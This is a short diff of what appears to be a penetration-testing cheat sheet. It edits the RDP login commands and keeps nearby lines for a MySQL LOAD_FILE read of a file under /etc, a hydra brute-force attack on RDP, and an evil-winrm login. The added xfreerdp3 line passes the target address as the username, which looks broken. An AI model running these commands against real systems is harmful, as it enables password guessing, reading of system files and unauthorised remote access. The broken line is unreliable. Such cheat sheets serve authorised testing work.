@@ -746,8 +746,7 @@ mysql -h "$TARGET" -u root --skip-ssl -p'$PASSWORD' -e "SELECT LOAD_FILE('/etc/p
 (hydra -I rdp://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
 +---------- Login to Service ----------+
-xfreerdp3 /v:'$TARGET' /d:'$DOM' -sec-nla /tls:seclevel:0 /dynamic-resolution +clipboard +drive:Downloads,"$HOME/Upload/"
-xfreerdp3 /u:'$USERNAME' /p:'$PASSWORD' /v:'$TARGET' /d:'$DOM' -sec-nla /tls:seclevel:0 /dynamic-resolution +clipboard +drive:Downloads,"$HOME/Upload/"
+xfreerdp3 /u:'$TARGET' /p:'$PASSWORD' /v:'$TARGET' /d:'$DOM' /cert:ignore /sec:tls +clipboard +drive:Downloads,"$HOME/Upload/"
 
 [*] (5985) WINRM
 evil-winrm -i "$TARGET" -u '$USERNAME' -p '$PASSWORD'
